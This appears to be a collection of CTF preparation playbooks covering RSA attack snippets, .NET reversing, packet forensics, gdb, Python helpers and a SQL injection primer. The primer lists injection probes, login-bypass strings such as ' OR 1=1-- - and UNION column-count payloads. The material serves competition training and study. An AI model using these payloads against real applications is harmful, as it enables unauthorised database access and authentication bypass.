RSA: shared prime from two public keys from math import gcd n1, n2, e, c = 3233, 2867, 17, 2790 # Worked values only p = gcd(n1, n2) if not 1 < p < n1: raise ValueError("No useful partial factor from this pair") q = n1 // p d = pow(e, -1, (p - 1) * (q - 1)) m = pow(c, d, n1) assert pow(m, e, n1) == c print(m.to_bytes(max(1, (m.bit_length() + 7) // 8), "big"))RSA: small public exponent without modular wrap def integer_root(value: int, exponent: int) -> tuple[int, bool]: """Return floor(value ** (1/exponent)) and whether it is exact.""" if value < 0 or exponent < 1: raise ValueError("Expected a nonnegative value and positive exponent") low, high = 0, 1 << ((value.bit_length() + exponent - 1) // exponent) while low < high: middle = (low + high + 1) // 2 if middle ** exponent <= value: low = middle else: high = middle - 1 return low, low ** exponent == value m = int.from_bytes(b"flag", "big") c = m ** 3 # Constructed example: no modular reduction root, exact = integer_root(c, 3) if exact: print(root.to_bytes(max(1, (root.bit_length() + 7) // 8), "big"))For real RSA, verify m**e < n or otherwise justify the no-wrap assumption. A small exponent alone is insufficient, and floating-point cube roots lose precision on large integers. For other weaknesses and attack selection see RsaCtfTool.
Sources: RSA keys, OAEP, PKCS1_OAEP compatibility API, PKCS#1 v1.5 encryption.
Save a ciphertext with its required metadata import base64 import json from pathlib import Path from Crypto.Cipher import AES from Crypto.Random import get_random_bytes key, nonce = get_random_bytes(32), get_random_bytes(12) aad = b"demo-header" encryptor = AES.new(key, AES.MODE_GCM, nonce=nonce) encryptor.update(aad) ciphertext, tag = encryptor.encrypt_and_digest(b"flag{demo}") def encode(value: bytes) -> str: return base64.b64encode(value).decode("ascii") record = {"algorithm": "AES-256-GCM", "encoding": "base64", "nonce": encode(nonce), "aad": encode(aad), "ciphertext": encode(ciphertext), "tag": encode(tag)} Path("encrypted.json").write_text(json.dumps(record, indent=2), encoding="utf-8") # Local round-trip example: key remains in this process; store/manage it separately loaded = json.loads(Path("encrypted.json").read_text(encoding="utf-8")) def decode(field: str) -> bytes: return base64.b64decode(loaded[field], validate=True) decryptor = AES.new(key, AES.MODE_GCM, nonce=decode("nonce")) decryptor.update(decode("aad")) print(decryptor.decrypt_and_verify(decode("ciphertext"), decode("tag")))For an unknown challenge format, first identify which bytes/fields represent metadata. Do not assume a universal nonce || ciphertext || tag order or that a JSON key named iv has the length your chosen mode expects.
Crypto troubleshooting by symptom Symptom Inspect before changing the algorithm Incorrect AES key length Hex/Base64 decoding, password versus KDF output CBC data not block aligned Input wrapper, truncated file, IV/header split PKCS#7 padding error Key, IV, mode, ciphertext completeness and padding convention CTR/ChaCha gives random-looking bytes Key/nonce/counter layout and stream offset GCM/EAX/Poly1305 tag failure All authenticated inputs, tag bytes/length and AAD RSA OAEP decryption error Private key, ciphertext width, hash/MGF/label and padding type Plausible prefix but broken remainder Key period, offset, partial corruption or false positive UnicodeDecodeError after decrypting Plaintext may be binary or use another encoding Correct result only with errors ignored Original bytes may have been corrupted or misinterpreted Keep intermediate values in hex and record their byte lengths. A successful authenticated verification or exact mathematical reconstruction is stronger evidence than a few readable characters.
CTF: parse a binary record without guessing endianness import struct record = bytes.fromhex("341278563412") kind, value = struct.unpack("<HI", record) print(hex(kind), hex(value)) # 0x1234 0x12345678< = little endian, > = big endian, H = unsigned 16-bit, I = unsigned 32-bit. Use struct.calcsize() before reading records. Check a real sample against the documented protocol.
CTF: make an authenticated HTTP request Standard library example; replace the URL, cookie and body with values captured from your challenge.
import json from urllib.request import Request, urlopen from urllib.error import HTTPError body = json.dumps({"id": 7}).encode() req = Request( "http://192.0.2.10:8080/api/item", data=body, headers={"Content-Type": "application/json", "Cookie": "session=REPLACE"}, method="POST", ) try: with urlopen(req, timeout=10) as response: print(response.status, response.read().decode(errors="replace")) except HTTPError as error: print(error.code, error.read().decode(errors="replace"))A 403 body is useful evidence; do not discard it. Change one request field at a time and preserve the original request.
CTF: receive a stateful TCP response This passive reader connects and saves received bytes. Replace the endpoint. Send protocol messages only after decoding the protocol and required setup actions.
from pathlib import Path import socket import time received = bytearray() deadline = time.monotonic() + 30 with socket.create_connection(("192.0.2.10", 31337), timeout=5) as sock: sock.settimeout(2) while time.monotonic() < deadline: try: chunk = sock.recv(65536) except socket.timeout: print("receive timeout; connection may still be open") continue if chunk == b"": print("peer closed connection (EOF)") break received.extend(chunk) print(repr(chunk), flush=True) Path("session.bin").write_bytes(received)TCP reads are not message boundaries. Buffer data until a delimiter or documented length is complete. For interactive challenges, keep the same socket for setup, commands and asynchronous success messages.
Handle common solver failures Symptom Inspect next UnicodeDecodeError Keep bytes; identify encoding before decoding Incorrect padding in Base64 Check alphabet, truncation and expected padding Wrong integer/plaintext Confirm hex vs decimal and byte order ModuleNotFoundError Check the active interpreter and environment ConnectionRefusedError Endpoint/port availability Timeout after receiving a banner Required prompt, newline or protocol state EOF Peer closed; preserve all bytes received before closure References: Python standard library, socket, struct, urllib.request.
Related playbooks Offline Python snippet library

title: .NET · dnSpyEx, Resources & IL
content:
.NET reversing Confirm managed metadata → find entry/event handler → read validation → inspect resources/static initialization → verify IL when C# is unclear. A PE extension alone does not identify managed code.
1. Open the right thing Use dnSpyEx for a managed executable or DLL. Check assembly/module metadata, references and namespaces. A native launcher may load a separate managed DLL; single-file or protected bundles may need extraction using the runtime’s actual packaging format.
If dnSpyEx cannot load metadata and Ghidra shows normal native code, reconsider whether it is a native PE, NativeAOT build, mixed-mode assembly or packed container. Do not assume every C#-related filename retains decompilable IL.
2. Find the user-controlled path Application Useful anchor Console Entry point / Main and input calls WinForms Button click handler, text box reads, designer event hookup WPF Event handlers / commands / XAML-associated classes Library Exports/public API used by provided harness Async program Generated state machine MoveNext Search distinctive success/failure strings. Use Analyze / references on the containing method. A name such as CheckPassword may be genuine, obfuscated or a decoy; follow actual call sites.
3. Record .NET text and numeric semantics .NET string is UTF-16 code units; s.Length is not UTF-8 byte length and is not necessarily Unicode character count. Encoding.UTF8.GetBytes explicitly converts to bytes. char is 16-bit; byte is 8-bit.
byte[] b = Encoding.UTF8.GetBytes(input); for (int i = 0; i < b.Length; i++) b[i] = (byte)(b[i] ^ 0x23);A matching Python model must encode input as UTF-8 before byte operations. For ASCII flags, code unit and byte values often coincide; that does not make them interchangeable for arbitrary Unicode.
4. Static constructors and resources A field’s apparent default value may be replaced by .cctor before validation. Inspect type initializers, RuntimeHelpers.InitializeArray, resource streams and helper decryptors.
Resource extraction route:
Assembly tree → Resources → selected entry → save/exportUse the available context-menu action in your installed version. A .resources container can hold strings, byte arrays and serialized values; exporting it does not automatically decode every contained object. Confirm type/length before interpreting it as ciphertext.
A common path is GetManifestResourceStream → decompression → decryption → Assembly.Load. Capture the bytes at the stage relevant to your question. A decoded managed assembly can often be reopened in dnSpyEx.
5. Read IL when decompiled C# is misleading IL Interpretation ldstr Load string literal ldc.i4 / ldc.i8 Load integer constant ldarg, ldloc, stloc Load argument/local, store local ldelem.u1 Load array element as unsigned byte conv.u1 Truncate/convert to unsigned byte xor, add, sub Width depends on stack types/conversions brtrue, brfalse Conditional branch on stack value ceq, cgt, clt Comparison result; unsigned variants matter call, callvirt Call target/dispatch and instance semantics Inspect the instruction before a branch and its target. An inverted C# if can be equivalent to the original flow. Overflow-checked operations and conversion variants can throw rather than wrap.
6. Debug managed checks Set a breakpoint in the validator or immediately after decryption. Start with the appropriate CLR/runtime and bitness. Inspect Locals, Watch and call stack; step through until the compared byte array is populated. Save the array without converting arbitrary bytes through a lossy text encoding.
For a GUI app, input may be trimmed, normalized or transformed in the event handler before entering the check. Capture both original text and actual validator argument.
7. Editing is a hypothesis tool Edit Method in C# or IL only in a copy. Save the modified module using the tool’s module-save action and note any strong-name/signature implications. Recompile errors can come from unresolved references or decompiler reconstruction, not necessarily wrong logic; small IL edits sometimes fit better than rebuilding an entire method.
A patched return value can expose a later page, but may skip real state/key generation. The valid input and flag still need independent verification against the original program.
8. Obfuscation leads Renamed identifiers: follow string references and actual data flow. String decryptors: inspect one call and the returned string after initialization. Control-flow flattening: recover dispatcher state/transitions. Reflection: inspect method/type names and resolved target at runtime. Anti-tamper: static bytes may be decrypted/validated before use. Do not execute unknown companion tools or install an old “universal deobfuscator” on the assumption it matches the protection. The supplied debugger often answers a narrow data question without a full deobfuscation pass.
References dnSpyEx repository, Microsoft IL opcode reference, Microsoft PE format, System.String.

title: 08 · FTP / Mail / ICMP / SMB
content:
Other Protocols: Find the Data Channel Flow: identify protocol → match control to data → reconstruct the correct direction → decode protocol content → verify the artifact.
Tools: Wireshark, TShark, Zeek, Python, CyberChef, xxd.
1. FTP: control and file data are separate ftp ftp-data ftp.request.command == "USER" ftp.request.command == "PASS" ftp.request.command == "RETR" ftp.request.command == "STOR" Follow the control stream and inspect login/status codes. Record the requested file and transfer direction. Inspect PORT / EPRT or PASV / EPSV setup. Identify the corresponding data connection. Save the data-channel direction containing the file, then inspect its bytes. A directory listing is not a downloaded archive. The first FTP stream may contain credentials while a later connection carries the actual artifact.
227 Entering Passive Mode (192,0,2,20,195,80)For this classic PASV example, data port = 195*256 + 80 = 50000. An advertised private/NAT address may differ from the actual flow; correlate packet endpoints.
FTP plaintext passwords are visible only if login is not protected by TLS. SFTP is an SSH subsystem, a different protocol; it is not parsed as ordinary FTP data.
2. SMTP: reconstruct the message smtp smtp.req.command == "AUTH" smtp.req.command == "DATA"Follow the relevant stream. Find envelope addresses, DATA, message headers, MIME boundaries, attachments, and transfer encodings. A 250 after a command indicates an SMTP response, not necessarily the challenge objective.
AUTH LOGIN / AUTH PLAIN values may be Base64-encoded. AUTH PLAIN has NUL-separated fields; decoding to text with ignored errors can conceal them. Inspect bytes in CyberChef/HxD.
For an extracted .eml message, Python’s standard library can decode MIME parts:
from email import policy from email.parser import BytesParser from pathlib import Path message = BytesParser(policy=policy.default).parsebytes(Path('mail.eml').read_bytes()) output = Path('mail-parts') output.mkdir(exist_ok=True) for index, part in enumerate(message.walk()): if part.is_multipart(): continue payload = part.get_payload(decode=True) if payload is None: continue destination = output / f'part-{index:03d}.bin' destination.write_bytes(payload) print(destination, part.get_content_type(), repr(part.get_filename()))The fixed generated filenames avoid trusting attachment names as filesystem paths. Determine file types from headers/magic, then inspect with the relevant approved tool.
If carving SMTP DATA manually, handle its terminator and dot-stuffing; network framing bytes are not part of the email message. Prefer a dissector/exporter when available.
3. POP and IMAP pop imapLook for message retrieval rather than only login. POP RETR responses can contain complete mail messages; IMAP literals have explicit byte counts and can span packets. Follow the stream and preserve exact literal bytes before using the MIME parser.
Ports are hints: POP/IMAP may use TLS from connection start or upgrade with a protocol command. If encrypted, continue to TLS/SSH.
4. ICMP / ping payloads icmp icmp.type == 8 icmp.type == 0 icmpv6Inspect one request/reply pair. Identify ICMP identifier, sequence, payload, and direction. Echo replies often repeat the request data; concatenating both directions duplicates the content.
tshark -r traffic.pcapng -Y 'icmp.type == 8 && data.data' \ -T fields -E separator=/t \ -e frame.number -e icmp.ident -e icmp.seq -e data.data > icmp.tsvThe data.data field appears when payload is left to the generic Data dissector. If empty, inspect the packet tree and choose the actual decoded payload field. Some ping tools place their own timestamp/pattern in the payload; remove bytes only when the sender format proves they are metadata.
Match retransmissions and sequence rollover. Preserve the raw export before decoding; a repeated payload chunk may be real content rather than a duplicate.
5. SMB: files and authentication are different evidence smb2 smb2.filename ntlmsspInspect share paths, opened file names, read/write operations, file IDs, and response status. TCP streams can multiplex several SMB operations and files; a whole-stream raw save is not one clean file.
Where supported:
File -> Export Objects -> SMBTShark object export names vary by installed exporter. Discover them before selecting an exporter:
tshark --export-objects helpSMB signing does not itself encrypt file contents. SMB encryption can hide them. An NTLM challenge/response is not a plaintext password; do not label it as recovered credentials without the appropriate verification.
6. RDP, databases, and custom protocols Use Protocol Hierarchy and Decode As only when bytes support the choice. Inspect negotiation, usernames, database names, result rows, or filenames when visible. Database protocols can carry their own authentication and TLS upgrades.
A binary field displaying readable ASCII is a useful lead, but avoid treating every printable run as a complete message. Validate framing and lengths.
7. UDP tunnels / unknown ports Use Follow UDP Stream to inspect a candidate exchange, then examine each datagram boundary. Look for sequence, length, checksum, and message type. A custom protocol may require application reassembly even though UDP datagrams remain distinct.
Do not replay an arbitrary packet until you identify the service context and whether the message is stateless. TCP/UDP sessions covers persistent protocol clients and outcome verification.
Export checklist Check Why Correct direction Requests can duplicate responses or contain control text Correct channel FTP control differs from FTP data Reassembled bytes Packet boundaries differ from protocol messages Protocol framing removed SMTP terminators / MIME boundaries / length prefixes Missing bytes identified A corrupt export may reflect a capture gap Original references kept Frame/stream evidence makes recovery reproducible References: FTP RFC 959, SMTP RFC 5321, Python email parser, Wireshark guide.

title: uv
content:
Use for: Python virtual environments and approved dependencies.
Run in: WSL.
Tournament rule: do not install AI/ML related packages or tools. The same restriction applies to Python and other extensible tools.
Quick start uv --version uv venv --python python3 source .venv/bin/activate uv pip list python solve.pyWalkthrough: prepare a solver environment mkdir -p ~/ajcbbc/solver cd ~/ajcbbc/solver uv venv --python python3 source .venv/bin/activate # Non-AI libraries; install only what your solver needs uv pip install requests pycryptodome uv pip freeze > requirements.txt python solve.pyExisting requirements source .venv/bin/activate uv pip install -r requirements.txt uv pip show pycryptodome deactivateInspect a supplied requirements file before installation to ensure it follows the tournament rule.
Gotchas Activate the environment in each new terminal or use its Python path explicitly. Crypto is the import namespace provided by pycryptodome. Package download access may be unavailable during the tournament. uv run can resolve dependencies; use the prepared environment’s Python when you want to run exactly what is already installed. Flags and subcommands explained Syntax Meaning uv venv DIR Create a virtual environment at DIR; default is .venv --python python3 Choose the existing interpreter for environment creation uv pip install PACKAGE Install into the selected/detected environment -r requirements.txt Read package requirements from that file --python PATH on uv pip Target a specific Python environment --offline Avoid network access; cached/local packages must suffice uv pip freeze Print installed package versions as requirements uv pip check Inspect installed dependency compatibility uv pip is uv’s package interface; it does not require invoking a separate pip executable. The environment’s interpreter still determines which packages a solver imports.
CTF: run with an explicit interpreter uv venv --python python3 .venv uv pip install --python .venv/bin/python requests pycryptodome .venv/bin/python solve.pyThis removes ambiguity when several terminals or environments are open. The packages are non-AI examples; install only the dependencies needed by your challenge.
CTF: recover from an interpreter mismatch python3 -c 'import sys; print(sys.executable)' .venv/bin/python -c 'import sys; print(sys.executable)' uv pip list --python .venv/bin/pythonIf installation succeeded but import fails, compare these paths before reinstalling packages globally.
CTF: use a supplied offline requirements set # Works only if the required distributions are already cached/available uv pip install --offline --python .venv/bin/python -r requirements.txt uv pip check --python .venv/bin/pythonA cache miss is an availability problem. Do not interpret it as proof that the solver or dependency name is wrong.
Preserve a reproducible solver environment uv pip freeze --python .venv/bin/python > solver_requirements.txt .venv/bin/python --version > python_version.txtRecord the solver script, interpreter and required input artifacts together. A frozen requirements file documents your environment but does not bundle offline wheels or system libraries.
Reference: uv environment guide, CLI reference.
Related playbooks Offline Python snippet library

title: 09 · Python / Ready Helpers
content:
Network Python Helpers Tools: Python 3 for scripts; TShark for packet parsing; CyberChef for visual encoding checks. Both downloads use Python’s standard library only.
Use an existing snippet only if the event permits prepared code. Keep the source offline alongside your notes and adapt endpoint/protocol values explicitly.
1. Downloads Helper Purpose Input session_client.py One persistent TCP conversation; exact send bytes; bounded buffered receive Host, port, JSON operation plan dns_reconstruct.py Suffix-aware, ordered DNS data reconstruction Bare qnames or final-column qname TSV Save the .py files locally. A browser may display the source; use Save As or copy the full file. They do not require an online API, AI library, or packet parsing package.
python3 session_client.py --help python3 dns_reconstruct.py --help2. TCP plan operations [ {"read_until_hex": "3e20", "timeout": 5}, {"send_text": "STATUS\r\n"}, {"read_until_hex": "3e20"}, {"send_file": "payload.bin"}, {"read_for": 10} ] Operation Behavior send_text Encode the exact string using UTF-8, or the action’s encoding send_hex Decode hex to bytes and send exactly those bytes send_file Send the file bytes; relative paths are beside the plan read_until_hex Read through delimiter; retain surplus for the next read read_for Collect incoming bytes for a total number of seconds or until EOF shutdown_write Half-close TCP sending; only for protocols expecting it For a half-close action, write {"shutdown_write": true}. Do not use it just to “flush” a connection; it tells the peer no further bytes will be sent.
python3 session_client.py 192.0.2.10 31337 plan.json \ --timeout 5 --max-bytes 8388608 --transcript session.jsonlNo newline is automatically added. "\r\n" in JSON becomes CRLF; "\\r\\n" would send literal backslash characters. Use send_hex when escape handling is uncertain.
3. Interpret TCP results correctly Every operation prints JSON with status, byte length, hex, and a text preview. Hex is authoritative for binary data. JSON text displays escaped control bytes intentionally.
Status Interpretation connected TCP connection established sent Bytes handed to socket; no proof application accepted them delimiter Exact expected byte delimiter received timeout Delimiter not reached before deadline deadline read_for collection period ended eof Peer closed its sending side limit Receive size cap reached; session stops connection_error / error Transport or plan operation failed On read_until_hex timeout, buffered data is retained. Its record has buffered_preview: true; this preview is not a newly consumed message. Repeated preview records can contain the same bytes.
To explicitly continue after that timeout:
{"read_until_hex":"0a", "timeout":2, "allow_timeout":true}Normally a missing prompt should stop the plan so a subsequent payload is not sent in the wrong state. EOF before a required delimiter stops it as well. The script does not infer objective completion from ACK text.
Exit status 0 means the plan completed, not that a flag was obtained. Status 2 is a connection/operation error, 3 is timeout/size-limit stop, and 4 is premature EOF.
4. DNS helper layouts Input:
1700000000.000000	0000.666c6167.exfil.example 1700000000.100000	0001.7b64656d6f7d.exfil.exampleUse actual tabs in TSV. Bare query names also work.
python3 dns_reconstruct.py queries.tsv --suffix exfil.example \ --sequence --start 0 --encoding hex --out recovered.binExpected bytes for those payload labels: flag{demo}.
--sequence recognizes a decimal first label and rejects missing/conflicting indices. Without it, capture order and duplicates are kept. --start 1 supports transfers starting at 1; split separate transfers before decoding.
--encoding supports hex, base32, base64, base64url, and ascii. Missing terminal padding is restored for Base32/Base64. Invalid alphabets are rejected rather than silently removed.
5. Decide when to decode chunks continuous encoded stream -> split into DNS chunks -> join chunks -> decode once individual raw chunks -> encode each independently -> decode chunks -> join bytesThe default is join then decode. Add --per-chunk for independently encoded query payloads. Applying the wrong order can corrupt data even when the alphabet looks valid.
The helper strips only the configured suffix and optional numeric sequence label. If the protocol adds client IDs, checksums, or length labels, isolate them first based on source/evidence.
6. Byte operations worth keeping import base64 import struct from urllib.parse import unquote_to_bytes print(bytes.fromhex('666c6167')) print(base64.b64decode('ZmxhZw==', validate=True)) print(unquote_to_bytes('%66%6c%61%67')) print(struct.unpack('!H', bytes.fromhex('1234'))[0]) print(int.from_bytes(bytes.fromhex('3412'), 'little'))Use a file’s raw bytes with Path(...).read_bytes(). Avoid newline conversion and lossy decoding. bytes.fromhex accepts whitespace; if whitespace is part of the protocol’s alphabet, first decide whether it is framing or data.
7. Capture parsing belongs to the packet tool Use TShark/Wireshark to handle PCAPNG interfaces, link-layer formats, IP fragmentation, and TCP reassembly. A tiny script that assumes every packet has a 14-byte Ethernet header will break on many real captures.
Export a well-defined field/object, preserve its frame/stream references, then feed those bytes into the helper. Neither supplied script reads PCAP directly.
Related: DNS workflow · TCP/UDP protocol workflow · Packet triage.
References: socket, base64, struct.

title: gdb
content:
Use for: debugging Linux binaries, registers, memory and comparisons.
Run in: WSL. Use x64dbg for native Windows PE debugging.
Start gdb -q ./challenge # Open a binary with less startup text gdb -q --args ./challenge demo # Also supply its command-line argumentsUseful commands set pagination off set disassembly-flavor intel info files info functions break main run disassemble main info registers x/12i $pc x/32bx $rsp x/s $rdi si ni finish continue bt info breakpoints delete 1 quit Commands Purpose break main, run Stop when main starts info files, info functions Find entry points, sections and symbols disassemble main, x/12i $pc Read function/current instructions info registers, x/32bx $rsp Inspect CPU state and stack bytes x/s $rdi Read a string at the address in a register si, ni Step one instruction into / over calls finish, continue Run until return / next stop bt Show the call stack info breakpoints, delete 1 List / remove breakpoints Register examples above assume x86-64.
Walkthrough: inspect a comparison break strcmp run x/s $rdi x/s $rsi bt finish print $eaxThis example assumes a dynamically linked Linux x86-64 binary using the System V ABI: the first two pointer arguments are in rdi and rsi. For memcmp, also inspect the byte length in rdx; bytes may include NULs.
Gotchas A stripped binary may have no main symbol; use starti, info files, and instruction addresses. PIE addresses vary with the load address; derive runtime locations. Optimized/inlined comparisons may never call strcmp. run < input.txt supplies stdin from a file. Launch flags and memory display syntax Syntax Meaning -q Suppress startup banner --args PROGRAM ARGS... Pass remaining arguments to the program -ex 'COMMAND' Execute one debugger command at startup; repeatable -batch Run scripted debugger commands then exit x/32bx ADDRESS Examine 32 units, byte size, hexadecimal format x/8gx ADDRESS Examine eight giant words, hexadecimal; each is eight bytes x/s ADDRESS Interpret memory as a NUL-terminated string x/10i ADDRESS Decode ten instructions In x/32bx, 32 is count, b is byte size and x is hex format. These letters belong to GDB’s examine command, not shell flags.
CTF: find the true entry point in a stripped binary starti info files info proc mappings x/16i $pcstarti stops at the first instruction actually executed; for a dynamic binary it may be in the loader. Use module mappings and info files to distinguish the loader from the executable.
CTF: break at a runtime code address break *0x555555555234 continue x/12i $pcReplace the address with the observed runtime location. For PIE, relate a disassembler offset to the correct loaded segment; the first mapping address is not always the required ELF load bias.
CTF: inspect binary compare arguments break memcmp run print $rdx x/32bx $rdi x/32bx $rsi finish print $eaxThis is Linux x86-64 System V. rdx gives the compared length. Do not use x/s alone for buffers that can contain NULs. For Windows x64, the first three arguments normally use RCX/RDX/R8.
CTF: detect when decoded bytes are written # First identify an actual writable address during this run watch *(unsigned int *)0x555555558040 continue bt x/32bx 0x555555558040Replace the example address. A watchpoint stops when the watched value changes; hardware slots and supported sizes are limited. Set it after the relevant storage exists and before the transformation executes.
CTF: search a known mapped region # Replace both bounds using info proc mappings find /b 0x555555558000, 0x555555559000, 0x66, 0x6c, 0x61, 0x67, 0x7bThe byte pattern is flag{. Search a readable range, then inspect each hit. Unmapped gaps can interrupt searching; narrow the region.
Save decoded memory to a file dump binary memory decoded.bin 0x555555558100 0x555555558180The stop address is excluded; the example saves 0x80 bytes. Use the actual runtime buffer address and validated length.
Reproduce stdin and collect a short debugger report gdb -q -batch \ -ex 'set pagination off' \ -ex 'run < input.txt' \ -ex 'bt' \ -ex 'info registers' ./challenge > debug_report.txt 2>&1-batch is suitable for a bounded reproducible stop/crash. Interactive protocols may need a live session instead.
Interpret a failed run Observation Next step Breakpoint never hits Check path, inlining, symbols and runtime address SIGSEGV Record PC, backtrace, registers and faulting instruction Correct comparison but rejected input Check later checks and complete success path Different behavior under debugger Timing, environment, ASLR or debugger checks Program waiting Inspect expected stdin/protocol rather than assuming a crash References: stepping, memory search, dumping memory.
Related playbooks Runtime debugging Reversible checker models

title: Python Snippets · Byte Workbench & Check Models
content:
Offline Python reversing snippets Download before the event, keep the model explicit and verify the forward transform. These command-line scripts use Python 3 standard library by default and make no network requests. They are separate from Ghidra’s script runtimes.
Downloads byte_workbench.py: explicit input bytes, slicing, XOR, all single-byte candidates, byte rotates/add/subtract, word swaps, Base64/hex and ROT13. solve_constraints.py: a documented reversible validator example with a forward assertion; optional --z3 solves the same model if that separate package is permitted and installed. These tools implement stated transformations; they do not automatically infer an unknown algorithm or solve arbitrary binaries. Local --output paths write binary files and may replace an existing file, so choose distinct output names.
1. CLI structure python byte_workbench.py --help python byte_workbench.py --hex 454f42445847464e4c5e xor --key-hex 23 python byte_workbench.py --text 'flag{demo}' xor --key-hex 112233 python byte_workbench.py --file blob.bin xor-scanGlobal input/output/slice options go before the operation. Operation arguments follow its name. Hex input accepts whitespace. --text uses UTF-8, while --file preserves raw bytes. Default output is a hex line plus Python byte representation; --output writes raw bytes only.
The single-byte demo prints:
666c61677b64656d6f7d b'flag{demo}'xor-scan prints all 256 keys with printable ratio; it does not rank a guaranteed answer. Inspect actual binary logic and expected flag format.
2. Chain exact operations with files python byte_workbench.py --file encrypted.bin --output step1.bin ror 3 python byte_workbench.py --file step1.bin --output step2.bin sub 7 python byte_workbench.py --file step2.bin --output decoded.bin xor --key-hex 23Only use this chain if those are the recovered inverse operations. Index-dependent subtraction is not the same as sub 7; implement the actual model in a short Python expression or the supplied template.
3. Slice / endianness / rotations python byte_workbench.py --file blob.bin --offset 0x20 --length 16 --output swapped.bin swap 4 python byte_workbench.py --hex 01020304 reverse python byte_workbench.py --hex 01020304 rol 3 python byte_workbench.py --hex 01020304 add 0x20swap 4 reverses bytes inside each 4-byte word and requires divisible length. reverse reverses the complete sequence. rol/ror rotate each individual 8-bit byte, not one large integer. Counts normalize modulo 8; addition/subtraction wrap modulo 256.
4. Encoding helpers python byte_workbench.py --text 'flag{demo}' b64encode python byte_workbench.py --text 'ZmxhZ3tkZW1vfQ==' b64decode python byte_workbench.py --text '666c6167' hexdecode python byte_workbench.py --text 'synt{qrzb}' rot13Base64 decoder accepts the standard alphabet and removes whitespace, but deliberately rejects invalid characters or missing padding. Base64url requires explicit handling; see strings/encodings. ROT13 accepts ASCII text; it is not a transform for arbitrary binary bytes.
5. Validator model demo The supplied constraint example models exactly:
y[i] = ROL8(((x[i] XOR key) + i) mod 256, rotation)python solve_constraints.py python solve_constraints.py --encode-text 'flag{demo}' python solve_constraints.py --target-hex YOUR_EXTRACTED_HEX --key 0x23 --rotation 3Default target is a built-in synthetic fixture for flag{demo}. Custom target is extracted data from a matching model. The script decodes it and asserts that applying the forward transform reproduces every target byte. That assertion validates consistency with the model; running the candidate through the actual program validates the model itself.
6. Optional Z3 mode python solve_constraints.py --z3This imports z3-solver only on request. It is not a standard-library dependency or an established approved tournament tool. If unavailable, the direct inverse still works for this bijective demo.
For a real cross-byte model, replace the constraints with the exact recovered operations and widths. Example shape:
# Optional external package, not needed by the normal downloads. from z3 import BitVec, Solver, ULT, LShR x = BitVec('x', 32) s = Solver() s.add(ULT(x, 1000)) s.add(LShR(x, 3) == 42)This example has multiple solutions; it does not produce a unique challenge key. Add all actual constraints, inspect satisfiability and verify candidates in the original binary.
7. Small reusable extraction / packing from pathlib import Path import struct raw = Path('challenge').read_bytes() offset, length = 0x100, 16 assert 0 <= offset <= len(raw) and offset+length <= len(raw) blob = raw[offset:offset+length] words = struct.unpack('<4I', blob) assert struct.pack('<4I', *words) == blob<4I is four unsigned little-endian 32-bit integers. Replace with the actual recovered representation. A 16-byte raw buffer is not automatically four meaningful integers.
8. Error interpretation Error Fix Invalid hex Remove address labels/punctuation; provide byte pairs Slice extends past input Correct file offset and length Empty XOR key Supply actual nonempty hex key Swap length mismatch Use correct region or word width Base64 padding error Check alphabet and original format before repairing Unknown CLI arguments Put global options before operation Z3 import error Use stdlib inverse or prepare permitted optional package Tool links and references Python tool cookbook, CyberChef, Ghidra bytes/export. APIs: argparse, struct, base64, Z3 Python.

title: 01 · SQLi — Start Here
content:
SQL Injection — Start Here Order: establish context → confirm true/false → identify engine → choose UNION or blind → enumerate schema → read the target row.
1. What does your input sit inside? Possible original query Try as the input Why WHERE id = INPUT 1 AND 1=1 / 1 AND 1=2 Numeric expression needs no quote WHERE name = 'INPUT' apple' AND '1'='1 / apple' AND '1'='2 Preserve the original closing quote WHERE name = 'INPUT' apple' AND 1=1-- - / apple' AND 1=2-- - Comment out the remaining query WHERE name LIKE '%INPUT%' apple%' AND 1=1-- - / apple%' AND 1=2-- - Close the wildcard string WHERE (name = 'INPUT') apple') AND 1=1-- - / apple') AND 1=2-- - Close the parenthesis too ORDER BY INPUT 1, 2, 999 Identifier/expression position, not a quoted value Choose apple / 1 to match an existing row. An AND test on a nonexistent row is false for both probes. If the query has extra predicates or nested parentheses, reconstruct that shape before copying a UNION payload.
Small quote probes:
' '' " 1' 1') 1'))One error is inconclusive. A quote error followed by a syntax repair is useful evidence, but escaping/validation can also create differences. Confirm with a boolean pair.
2. Confirm injection Numeric value 1 AND 7=7 1 AND 7=8Single-quoted string apple' AND 7=7-- - apple' AND 7=8-- -Authentication query, if the challenge gate is a vulnerable login admin'-- - ' OR 1=1-- - ' OR 'a'='a'-- - ') OR ('a'='a')-- -These bypass only certain query shapes. They do not bypass password verification performed separately after fetching a user, and an OR may select an arbitrary user. Confirm the actual account/role after login.
Comment syntax Engine Comments Caveat MySQL / MariaDB -- , #, /* ... */ -- needs following whitespace/control; use -- - PostgreSQL --, /* ... */ No MySQL # comment SQLite --, /* ... */ A driver can restrict statement count SQL Server --, /* ... */ Types matter in UNION Oracle --, /* ... */ Traditional UNION probes use FROM dual 3. Identify the database Use errors + a matching function + stack/source evidence. A function failure can be caused by the wrong SQL context; never decide from one generic 500.
Error clue Likely engine Expression to retrieve in a working output slot You have an error in your SQL syntax, MariaDB, mysqli MySQL / MariaDB VERSION() and DATABASE() PostgreSQL, pg_query, unterminated quoted string, SQLSTATE 42601 PostgreSQL version() and current_database() SQLite, sqlite3, no such table, near ... syntax error SQLite; generic fragments need corroboration sqlite_version() Unclosed quotation mark, SQL Server, ODBC Driver ... SQL Server SQL Server @@VERSION and DB_NAME() ORA-01756, ORA-00933, ORA-00942 Oracle banner FROM v$version, or USER FROM dual Blind corroboration examples after finding the right quoting:
1 AND sqlite_version() IS NOT NULL 1 AND current_database() IS NOT NULL 1 AND DB_NAME() IS NOT NULL 1 AND DATABASE() IS NOT NULLversion() works on both MySQL and PostgreSQL. @@version works on MySQL and SQL Server. A successful shared function is not a unique fingerprint. Read the returned text or pair with engine-specific behavior.
4. Does the query return rows into the response? Count selected columns 1' ORDER BY 1-- - 1' ORDER BY 2-- - 1' ORDER BY 3-- - 1' ORDER BY 4-- -If 3 works and 4 fails with a position error, try three columns. A hidden error or an unrelated type error makes this inconclusive.
no_such_value' UNION SELECT NULL-- - no_such_value' UNION SELECT NULL,NULL-- - no_such_value' UNION SELECT NULL,NULL,NULL-- -Oracle adaptation: UNION SELECT NULL,NULL,NULL FROM dual. Use a false original condition/value so original rows do not hide the injected row.
